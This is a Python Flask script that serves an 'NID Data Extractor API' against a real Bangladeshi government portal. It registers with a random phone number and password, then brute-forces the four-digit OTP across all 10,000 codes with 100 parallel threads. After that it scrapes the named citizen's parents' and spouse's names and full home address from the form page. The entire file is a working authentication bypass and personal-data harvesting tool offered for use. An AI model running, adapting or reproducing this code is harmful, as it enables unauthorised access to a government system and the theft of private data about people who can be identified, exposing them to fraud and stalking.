import requests
import random
import string
import re
import json
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

app = Flask(__name__)

# ==================== CONFIG ====================
OTP_RANGE = [f"{i:04d}" for i in range(10000)]
MOBILE_PREFIX = "016"
BATCH_SIZE = 500

def random_mobile(prefix):
    return prefix + f"{random.randint(10000000, 99999999):08d}"

def random_password():
    return "#" + random.choice(string.ascii_uppercase) + ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_session_and_bypass(nid, dob, mobile, password):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    data = {
        "nidNumber": nid,
        "email": "",
        "mobileNo": mobile,
        "dateOfBirth": dob,
        "password": password,
        "confirm_password": password,
        "next1": ""
    }
    
    session = requests.Session()
    response = session.post(url, data=data, headers=headers, allow_redirects=False)
    
    if response.status_code == 302 and 'mov-verification' in response.headers.get('Location', ''):
        return session
    else:
        raise Exception("Bypass Failed")

def try_otp(session, otp):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    data = {
        "otpDigit1": otp[0],
        "otpDigit2": otp[1],
        "otpDigit3": otp[2],
        "otpDigit4": otp[3]
    }
    
    response = session.post(url, data=data, headers=headers, allow_redirects=False)
    
    if response.status_code == 302 and 'movementContractor/form' in response.headers.get('Location', ''):
        return otp
    return None

def try_batch(session, otp_batch):
    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
        for future in as_completed(future_to_otp):
            result = future.result()
            if result:
                executor.shutdown(wait=False, cancel_futures=True)
                return result
    return None

def fetch_form_data(session):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    response = session.get(url, headers=headers)
    return response.text

def extract_fields(html, ids):
    result = {}
    for field_id in ids:
        pattern = rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"'
        match = re.search(pattern, html)
        result[field_id] = match.group(1) if match else ""
    return result

def enrich_data(nid, dob, contractor_name, result):
    mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.get("fatherName", ""),
        "motherName": result.get("motherName", ""),
        "spouseName": result.get("spouseName", ""),
        "gender": "",
        "religion": "",
        "birthPlace": result.get("nidPerDistrict", ""),
        "nationality": result.get("nationality", ""),
        "division": result.get("nidPerDivision", ""),
        "district": result.get("nidPerDistrict", ""),
        "upazila": result.get("nidPerUpazila", ""),
        "union": result.get("nidPerUnion", ""),
        "village": result.get("nidPerVillage", ""),
        "ward": result.get("nidPerWard", ""),
        "zip_code": result.get("nidPerZipCode", ""),
        "post_office": result.get("nidPerPostOffice", "")
    }

    address_parts = [
        f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
        f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
        f"মৌজা/মহল্লা: {result.get('nidPerMouza', '')}",
        f"ইউনিয়ন ওয়ার্ড: {result.get('nidPerUnion', '')}",
        f"ডাকঘর: {result.get('nidPerPostOffice', '')} - {result.get('nidPerZipCode', '')}",
        f"উপজেলা: {result.get('nidPerUpazila', '')}",
        f"জেলা: {result.get('nidPerDistrict', '')}",
        f"বিভাগ: {result.get('nidPerDivision', '')}"
    ]
    address_line = ", ".join([p for p in address_parts if p.split(": ")[1]])

    mapped["permanentAddress"] = address_line
    mapped["presentAddress"] = address_line
    return mapped

@app.route('/')
def home():
    return jsonify({
        "status": "active",
        "message": "NID Data Extractor API is running",
        "endpoints": {
            "extract": "/extract?nid=YOUR_NID&dob=YYYY-MM-DD",
            "example": "/extract?nid=1234567890&dob=1990-01-15"
        }
    })

@app.route('/extract', methods=['GET'])
def extract():
    # Get parameters from URL
    nid = request.args.get('nid')
    dob = request.args.get('dob')
    
    if not nid or not dob:
        return jsonify({
            "success": False,
            "message": "Please provide both nid and dob parameters",
            "example": "/extract?nid=1234567890&dob=1990-01-15"
        }), 400
    
    try:
        # Generate random credentials
        mobile = random_mobile(MOBILE_PREFIX)
        password = random_password()
        
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Starting extraction for NID: {nid}")
        print(f"Using Mobile: {mobile}")
        print(f"Using Password: {password}")
        
        response_data = {
            "success": True,
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
            "parameters": {
                "nid": nid,
                "dob": dob
            },
            "generatedCredentials": {
                "mobile": mobile,
                "password": password
            },
            "steps": {},
            "extractedData": {}
        }
        
        # Step 1: Get session and bypass initial verification
        print("Step 1: Bypassing initial verification...")
        try:
            session = get_session_and_bypass(nid, dob, mobile, password)
            response_data["steps"]["initialBypass"] = {
                "status": "success",
                "message": "Initial bypass successful"
            }
            print("✓ Initial bypass successful")
        except Exception as e:
            response_data["success"] = False
            response_data["message"] = f"Initial bypass failed: {str(e)}"
            return jsonify(response_data), 500
        
        # Step 2: Try OTPs in batches
        print("Step 2: Brute-forcing OTP...")
        random.shuffle(OTP_RANGE)
        found_otp = None
        
        total_batches = (len(OTP_RANGE) // BATCH_SIZE) + 1
        for i in range(0, len(OTP_RANGE), BATCH_SIZE):
            batch = OTP_RANGE[i:i+BATCH_SIZE]
            batch_number = i // BATCH_SIZE + 1
            print(f"Trying batch {batch_number}/{total_batches}...")
            found_otp = try_batch(session, batch)
            if found_otp:
                response_data["generatedCredentials"]["otp"] = found_otp
                response_data["steps"]["otpBruteforce"] = {
                    "status": "success",
                    "message": f"OTP found in batch {batch_number}",
                    "otp": found_otp,
                    "batchesTried": batch_number
                }
                print(f"✓ OTP found: {found_otp}")
                break
        
        if not found_otp:
            response_data["success"] = False
            response_data["message"] = "OTP not found after trying all combinations"
            response_data["steps"]["otpBruteforce"] = {
                "status": "failed",
                "message": "OTP not found after trying all 10000 combinations",
                "batchesTried": total_batches
            }
            return jsonify(response_data), 404
        
        # Step 3: Fetch form data
        print("Step 3: Fetching form data...")
        try:
            html = fetch_form_data(session)
            response_data["steps"]["fetchFormData"] = {
                "status": "success",
                "message": "Form data fetched successfully"
            }
        except Exception as e:
            response_data["success"] = False
            response_data["message"] = f"Failed to fetch form data: {str(e)}"
            return jsonify(response_data), 500
        
        # Step 4: Extract and enrich data
        field_ids = [
            "contractorName", "fatherName", "motherName", "spouseName", 
            "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
            "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice"
        ]
        
        try:
            extracted_data = extract_fields(html, field_ids)
            final_data = enrich_data(nid, dob, extracted_data.get("contractorName", ""), extracted_data)
            
            # Add credentials to final data
            final_data["mobile"] = mobile
            final_data["password"] = password
            final_data["otp"] = found_otp
            
            response_data["extractedData"] = final_data
            response_data["steps"]["dataExtraction"] = {
                "status": "success",
                "message": "Data extracted and enriched successfully",
                "fieldsExtracted": len(extracted_data)
            }
            
            print("\n" + "="*50)
            print("EXTRACTION COMPLETE")
            print("="*50)
            
            return jsonify(response_data)
            
        except Exception as e:
            response_data["success"] = False
            response_data["message"] = f"Data extraction failed: {str(e)}"
            return jsonify(response_data), 500
            
    except Exception as e:
        return jsonify({
            "success": False,
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
            "message": f"Unexpected error: {str(e)}"
        }), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
